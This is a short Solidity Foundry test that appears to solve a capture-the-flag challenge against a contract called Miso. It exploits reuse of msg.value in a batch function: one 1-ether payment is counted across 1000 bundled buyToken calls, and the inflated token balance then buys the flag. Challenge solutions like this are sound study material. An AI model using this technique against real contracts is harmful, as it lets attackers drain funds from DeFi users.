// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {Miso} from "src/Miso.sol";

contract Solve is Test {
    Miso miso;

    function test() public {
        miso = new Miso();
        bytes[] memory calls = new bytes[](1000);
        for (uint256 i = 0; i < 1000; i++) {
            calls[i] = abi.encodeWithSelector(Miso.buyToken.selector);
        }
        miso.batch{value: 1 ether}(calls);
        console.log("balance:", miso.balanceOf(address(this)));
        miso.buyFlag();
        console.log("flag:", miso.flag(address(this)));
    }
}
